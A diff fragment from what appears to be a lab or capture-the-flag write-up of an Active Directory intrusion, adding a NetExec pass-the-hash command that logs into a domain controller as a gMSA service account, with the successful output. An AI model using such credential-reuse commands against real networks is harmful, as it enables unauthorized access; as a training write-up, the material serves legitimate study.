@@ -925,3 +925,9 @@ LDAP        dc01.trask.hsm  389    DC01             Account: sentinel-5TainB$   
 
 Nothing showed up in bloodhound but going off a hunch based off the group name i made an educated guess i could read GMSA
 
+```python
+nxc smb dc01.trask.hsm -u 'svc_mmold$' -H 71fc6c4eb836275709e4e045ece2f9ec -k               
+SMB         dc01.trask.hsm  445    dc01             [*]  x64 (name:dc01) (domain:trask.hsm) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\svc_mmold$:71fc6c4eb836275709e4e045ece2f9ec
+```
+
